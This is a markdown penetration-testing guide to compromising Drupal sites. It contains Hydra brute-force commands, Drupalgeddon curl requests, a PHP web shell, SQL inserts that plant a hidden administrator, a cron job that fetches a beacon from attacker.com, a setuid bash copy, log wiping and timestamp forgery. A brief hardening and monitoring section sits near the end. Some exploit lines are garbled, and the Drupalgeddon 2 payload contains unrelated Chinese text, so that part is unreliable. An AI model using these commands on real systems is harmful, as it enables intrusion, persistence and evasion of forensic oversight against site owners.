# 🛰️ Drupal Exploitation & Persistence

## Overview [!ABSTRACT]
Drupal is a widely-used content management system (CMS) with an enterprise focus, requiring specialized techniques for exploitation due to its robust security features and complex module ecosystem. This guide covers advanced penetration testing methodologies for compromising Drupal installations, including core vulnerabilities like Drupalgeddon, custom module exploits, and database attacks.

## Discovery & Enumeration

### Drupal Version Identification [!INFO]
1. Identify version via CHANGELOG.txt or meta tags.
2. Use DroopeScan (`git clone https://github.com/sensepost/droope.git`).

```bash
# DroopeScan usage example:
python droope.py -u http://target.com --verbose
```

### Module & Configuration Discovery [!INFO]
1. Enumerate installed modules using DroopeScan.
2. Analyze settings.php for database credentials.

```text
# Example findings from settings.php:
$database = 'drupal';
$databases['default']['default'] = array(
  'driver' => 'mysql',
  'username' => 'root',
  'password' => 'admin123',
  'host' => 'localhost',
  'database' => 'drupal_db'
);
```

### User Enumeration [!INFO]
- Brute force admin accounts using [[Hydra]] or attempt default credentials like `admin:pass`.

```bash
# Hydra usage example:
hydra -l admin -P /usr/share/wordlists/rockyou.txt http://target.com/admin post-form="/user/login?destination=node:/user/login:username=^A&password=^B"
```

## Exploitation Techniques

### Core Vulnerability Attacks [!WARNING]
- **Drupalgeddon 2 (CVE-2018-7600)**:
  - POST request to /user/password with crafted payload.

```bash
# Drupalgeddon 2 exploit example:
curl -XPOST http://target.com/user/password -d 'name[0x0a]=test&mail=test@example.com&test=00000000:00000000:00000000:体制机制创新'
```

- **Drupalgeddon 3 (CVE-2018-7602)**:
  - Exploits RESTful API endpoint.

```bash
# Drupalgeddon 3 exploit example:
curl -XGET http://target.com/entity/query?_format=json&constrained=1%5B0%5D.op=%3C&page%5Bsize%5D=1
```

### Custom Module Exploitation [!WARNING]
- **CKEditor Vulnerabilities**:
  - XSS via CKEditor configuration.

```bash
# Example payload to inject into CKEditor instance:
<script>alert('XSS')</script>
```

### Database Attacks [!CAUTION]
- Extract database credentials from settings.php.
- Use SQL injection if user enumeration reveals weak permissions.

## Backdoor & Persistence Mechanisms

### Backdoor Deployment Techniques [!DANGER]

#### Web Shell Backdoors
```bash
# PHP backdoor example:
<?php
if(isset($_GET['cmd'])){
  system($_GET['cmd']);
}
?>
```

- Upload via file upload vulnerabilities or module manipulation.
- Place backdoors in less likely directories like `files/.cache.php`.

#### Database Persistence
```sql
-- Add new user with administrative privileges
INSERT INTO users (name, pass) VALUES ('sysadmin', '$S$D7n1j4LcH/YouHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld');

# Add administrative privileges
INSERT INTO users_roles (uid, rid)
SELECT uid, 3 FROM users WHERE name = 'sysadmin';
```

#### Crontab Persistence
```bash
# Establish cron-based backdoor
curl "http://target.com/shell.php?cmd=echo+'*/5+*+*+*+*+wget+-q+-O-+http://attacker.com/beacon+>+/dev/null'+|+crontab+-"

# Alternative: systemd timer (modern systems)
curl "http://target.com/shell.php?cmd=systemctl+--user+enable+backdoor.timer"
```

#### File System Persistence
```bash
# Hide backdoor in Drupal cache directory
curl "http://target.com/shell.php?cmd=echo+'<?php+eval(\$_GET[x]);?>'+>+/var/www/html/sites/default/files/.cache.php"

# Create hidden system service
curl "http://target.com/shell.php?cmd=cp+/bin/bash+/tmp/.system-update"
curl "http://target.com/shell.php?cmd=chmod+u+s+/tmp/.system-update"
```

### Defense Evasion Techniques [!CAUTION]

#### Log Cleaning & Anti-Forensics
```bash
# Clear web server access logs
curl "http://target.com/shell.php?cmd=echo+''>/var/log/apache2/access.log"

# Clear system authentication logs
curl "http://target.com/shell.php?cmd=echo+''>/var/log/auth.log"
curl "http://target.com/shell.php?cmd=echo+''>/var/log/secure"

# Remove command history
curl "http://target.com/shell.php?cmd=history+-c"
```

#### Timestamp Manipulation
```bash
# Preserve original file timestamps
curl "http://target.com/shell.php?cmd=stat+/var/www/html/index.php"
# Note original timestamp

# After modifications, restore timestamp
curl "http://target.com/shell.php?cmd=touch+-t+202301151430.00+/var/www/html/backdoor.php"
```

---

## Comprehensive Security Assessment

### Drupal-Specific Vulnerability Research [!INFO]

#### Core Vulnerability Timeline
```bash
# Major Drupal vulnerabilities by version:

Drupal 6.x:
- CVE-2014-3704 (Drupalgeddon)
- Multiple XSS vulnerabilities
- Session fixation issues

Drupal 7.x:
- CVE-2014-3704 (Drupalgeddon)
- CVE-2018-7600 (Drupalgeddon 2)
- CVE-2018-7602 (Drupalgeddon 3)
- CVE-2019-6340 (REST API RCE)

Drupal 8.x:
- CVE-2018-7600 (Drupalgeddon 2)
- CVE-2018-7602 (Drupalgeddon 3)
- CVE-2020-13671 (Access bypass)

Drupal 9.x:
- CVE-2021-32610 (Access bypass)
- Various information disclosure issues
```

#### Module-Specific Research [!INFO]
```bash
# High-risk contributed modules:
searchsploit "drupal views"
searchsploit "drupal webform" 
searchsploit "drupal ckeditor"
searchsploit "drupal media"

# Research methodology:
1. Identify installed modules via /admin/modules
2. Extract version numbers from .info files
3. Cross-reference with CVE databases
4. Test for known vulnerabilities
5. Analyze custom module security
```

### Professional Methodology Integration [!INFO]

#### Multi-Vector Assessment Workflow
```bash
# Phase 1: Discovery & Enumeration
1. Version fingerprinting (CHANGELOG.txt, meta tags)
2. Module enumeration (DroopeScan, manual)
3. User enumeration (registration, password reset)
4. Content discovery (node enumeration)

# Phase 2: Vulnerability Assessment  
5. Core vulnerability research (Drupalgeddon series)
6. Module vulnerability analysis (contrib modules)
7. Configuration assessment (PHP filter, permissions)
8. Custom code review (if accessible)

# Phase 3: Exploitation & Access
9. Credential attacks (brute force, default)
10. Core vulnerability exploitation
11. Module-specific attacks
12. Administrative functionality abuse

# Phase 4: Post-Exploitation & Persistence
13. System enumeration and privilege escalation
14. Database access and manipulation
15. Persistence mechanism deployment
16. Network pivoting and lateral movement
```

---

## Defensive Considerations [!INFO]

### Security Hardening Recommendations

#### Core Security Measures
```bash
# Essential Drupal security hardening:
1. Remove/rename update.php after updates
2. Disable PHP Filter module in production
3. Regular core and module updates
4. Strong administrative passwords
5. Two-factor authentication implementation
6. File permission hardening (644/755)
7. Database access restrictions
8. Web server security headers
```

#### Module Security Management
```bash
# Contributed module security:
1. Regular module updates via Drush/Composer
2. Remove unused/abandoned modules
3. Review module permissions regularly
4. Monitor Drupal security advisories
5. Test modules in staging environment
6. Implement module whitelisting
```

### Monitoring and Detection [!INFO]

#### Attack Pattern Recognition
```bash
# Monitor for Drupal-specific attacks:
- CHANGELOG.txt access attempts
- /admin path enumeration  
- Node parameter tampering
- PHP Filter module activation
- Unusual module uploads
- Database query anomalies
- File system modifications

# Log analysis for Drupal attacks:
tail -f /var/log/apache2/access.log | grep -E "(drupal|admin|node|php)"
```

#### Security Monitoring Implementation
```bash
# File integrity monitoring
find /path/to/drupal -type f -exec md5sum {} \; > baseline.md5

# Database credentials monitoring
grep -r 'database' /var/www/html/sites/

# Real-time log analysis
tail -f /var/log/apache2/access.log | egrep 'drupal|admin'
```

---

## Related Topics & Tools [!INFO]

### Related Tools
- **DroopeScan**: Module enumeration and information gathering.
- **SQLMap**: Database attacks for SQL injection.
- **Hydra**: User enumeration via brute force.

### Additional Reading
- OWASP Drupal Security Cheat Sheet
- NVD (National Vulnerability Database) for recent CVEs

---

# 📝 Conclusion [!INFO]
Drupal exploitation requires a deep understanding of its architecture and common vulnerabilities. By following this guide, penetration testers can effectively assess the security posture of Drupal installations and identify potential weaknesses that could be exploited.

---

---


## Related Topics & Tools

### Tools
- **DroopeScan**: https://github.com/sensepost/droope
- **SQLMap**: https://sqlmap.org/
- **Hydra**: http://www.kali.org/tools/hydra/

### Additional Reading
- OWASP Drupal Security Cheat Sheet: https://owasp.org/www-project-top-ten-drupal-security-cheat-sheet/
- NVD (National Vulnerability Database): https://nvd.nist.gov/vuln/search

---

## Conclusion [!INFO]
Drupal exploitation and security assessment require a thorough understanding of its architecture, core vulnerabilities, and module-specific weaknesses. By following this guide, penetration testers can effectively identify and mitigate potential security risks in Drupal installations.

---

---


# 🧪 Exercises & Challenges
1. Conduct version fingerprinting on a live Drupal instance.
2. Enumerate installed modules using DroopeScan.
3. Exploit a known vulnerability (e.g., CVE-2018-7600).
4. Implement and test various persistence mechanisms.
5. Write custom scripts to automate log analysis for suspicious activities.

---


# 📚 References
- [Drupal Security Advisories](https://www.drupal.org/security-advisories)
- [OWASP Drupal Security Cheat Sheet](https://owasp.org/www-project-top-ten-drupal-security-cheat-sheet/)
- [DroopeScan Documentation](https://github.com/sensepost/droope)

---

# 📜 License
This guide is provided under the MIT license. Attribution is appreciated.

---


## Contributors
- **Author**: Penetration Tester
- **Contributors**: Various Security Researchers

---

---

## Feedback & Support
Feel free to reach out with questions, feedback, or contributions!

---
**End of Guide** 🚀🚀🚀